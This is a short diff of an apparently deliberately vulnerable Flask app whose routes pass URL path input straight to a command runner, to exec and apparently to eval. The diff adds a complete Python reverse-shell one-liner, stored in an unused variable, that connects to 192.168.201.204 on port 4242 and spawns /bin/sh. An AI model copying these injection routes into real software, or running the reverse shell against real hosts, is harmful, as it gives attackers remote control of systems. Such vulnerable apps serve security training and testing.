@@ -12,10 +12,10 @@ def run_cmd(cmd):
 @app.route('/cmdinj/<cmd>')
 def main(cmd):
 	return run_cmd(cmd)
-
 @app.route('/pyexecinj/<cmd>')
 def pyexecinj(cmd):
-	return str(exec(cmd))
+	rev_shell = "export RHOST=\"192.168.201.204\";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+	return exec(cmd)
 
 @app.route('/pyevalinj/<cmd>')
 def pyevalinj(cmd):
